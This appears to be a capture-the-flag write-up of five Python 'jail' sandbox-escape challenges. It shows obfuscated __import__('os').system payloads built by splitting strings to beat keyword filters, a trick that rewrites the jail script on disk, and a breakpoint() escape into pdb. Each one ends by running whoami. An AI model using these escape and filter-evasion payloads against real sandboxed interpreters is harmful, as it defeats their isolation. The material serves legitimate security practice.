# Jail 1

```
>>>jail([])
>>>__import__('os').system('whoami')
feduser
>>> 
```

---

# Jail 2

```
>>>add2history(history, "_"+"_im"+"port_"+"_(\'o"+"s\')"+f"{chr(46)}system(\'whoami\')")
>>>print(history)
['add2history(history, "_"+"_im"+"port_"+"_(\\\'o"+"s\\\')"+f"{chr(46)}system(\\\'whoami\\\')")', "__import__('os').system('whoami')", 'print(history)']
>>>run(history[1])
feduser
>>>
```

---

# Jail 3

```
>>>(lambda f: f.write("im"+"port judge\n\n"f'def jail():\n\t{"im"+"port"+" o"+"s"}\n\tbanned_words = []\n\tcommand = str(input("Hacked>>>"))\n\tif any(bad in command for bad in banned_words):\n\t\tprint("Unauthorized command.")\n\t\treturn\n\ttry:\n\t\tresult={"ex"+"ec"}(command)\n\t\tprint(result)\n\texcept Exception as e:\n\t\tprint(f"Invalid command")\nwhile True:\n\tif judge.if_who_am_i_detected():\n\t\timp"+"ort flagger\n\t\tprint(flagger.get_flag("jail 3"))\n\tjail()\n'))(open('jail3','w'))
285
File size changed, reloading...
Hacked>>>import os
None
Hacked>>>os.system("whoami")
feduser
None
Hacked>>>
```

---

# Jail 4

```
>>>breakpoint()
> <string>(1)<module>()
(Pdb) import os
(Pdb) os.system("whoami")
feduser
0
(Pdb) c
```

---

# Jail 5

```
Unknown, maybe something like this:

#["exe"+"c(_"+"_im"+"port_"+"_('o"+"s')"+f"{chr(46)}system('whoami'))"][0]

compile("_"+"_im"+"port_"+"_('o"+"s')"+f"{chr(46)}system('whoami')", "test", "single")
```
